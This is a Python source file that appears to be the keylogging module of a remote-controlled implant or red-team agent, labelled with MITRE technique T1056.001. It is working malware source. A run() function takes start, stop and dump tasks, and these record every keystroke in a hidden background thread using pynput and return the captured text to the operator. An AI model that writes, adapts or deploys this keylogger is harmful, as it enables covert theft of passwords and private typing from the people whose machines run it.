"""
Agent keylog module — start/stop/dump keyboard capture.
T1056.001: Input Capture: Keylogging
"""
from __future__ import annotations

import threading

_buffer: list[str] = []
_thread: threading.Thread | None = None
_running = False


def _capture() -> None:
    try:
        from pynput import keyboard  # type: ignore

        def on_press(key):
            try:
                _buffer.append(key.char or "")
            except AttributeError:
                _buffer.append(f"[{key}]")

        with keyboard.Listener(on_press=on_press) as listener:
            while _running:
                listener.join(timeout=0.1)
    except Exception as exc:
        _buffer.append(f"[keylog error: {exc}]")


def run(task: dict) -> str:
    global _thread, _running
    action = task.get("action", "dump")

    if action == "start":
        if _thread and _thread.is_alive():
            return "already running"
        _running = True
        _thread = threading.Thread(target=_capture, daemon=True)
        _thread.start()
        return "keylog started"

    if action == "stop":
        _running = False
        return "keylog stopped"

    if action == "dump":
        data = "".join(_buffer)
        _buffer.clear()
        return data or "(empty)"

    return f"unknown action: {action}"
